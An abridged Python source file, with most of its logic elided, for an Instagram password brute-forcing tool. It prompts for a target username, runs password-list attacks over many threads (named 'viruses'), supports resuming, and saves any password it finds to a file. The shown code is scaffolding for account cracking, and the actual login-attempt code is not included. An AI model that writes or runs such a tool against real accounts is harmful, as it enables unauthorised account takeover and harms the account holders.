...
from lib.const import credentials, viruses
...
class Forcer(object):
    ...
    def __init__(self, username, threads, passlist_path, is_color = True):
        self.bruter = None
        self.resume = False
        self.is_alive = True
    ...
    def passlist_path_exists(self):
        if not exists(self.passlist_path):
            self.display.warning("Invalid path to file or File doesn't exist")
            return False
        return True
    ...
    def get_user_resp(self):
        return self.display.prompt('Would you like to Resume? ')
    ...
    def start(self):
        ...
        if self.is_alive:
            ...
            try:
                ...
                self.bruter.stop()
                self.bruter.display.shutdown(self.bruter.last_password, self.bruter.password_manager.attempts, len(self.bruter.browsers))
    ...
    def stop(self):
        if self.is_alive:
            ...
            if self.bruter.password_manager.is_read and not self.bruter.is_found and not self.bruter.password_manager.list_size:
                self.bruter.display.stats_not_found(self.bruter.last_password, self.bruter.password_manager.attempts, len(self.bruter.browsers))

            if self.bruter.is_found:
                self.write_to_file(self.bruter.password)
                self.bruter.display.stats_found(self.bruter.password, self.bruter.password_manager.attempts, len(self.bruter.browsers))
...
def valid_int(n):
    ...
    if n > 3:
        raise ArgumentTypeError('maximum for viruses is 3')
    if n < 0:
        raise ArgumentTypeError('minimum for viruses is 0')
...
if __name__=='__main__':
    ...
    if int(python_version()[0]) < 3:
        print('[!] Please use python version more than or equal to 3 (python3) ')
        exit()
    ...
    default_test_username = 'mr.attitude23456'
    username = input( "\x1b[3m" + Fore.CYAN + "\x1b[1m" + "Please Enter the Instagram Username [Enter for Test Username]:\n" + Fore.WHITE + "=" + Fore.YELLOW + ">\t") or default_test_username
    print("\n")
    ...
    print(Fore.RESET)
    viruses = arguments.viruses
    is_color = True if not arguments.color else False
    Forcer(username, viruses, passlist_path, is_color).start()
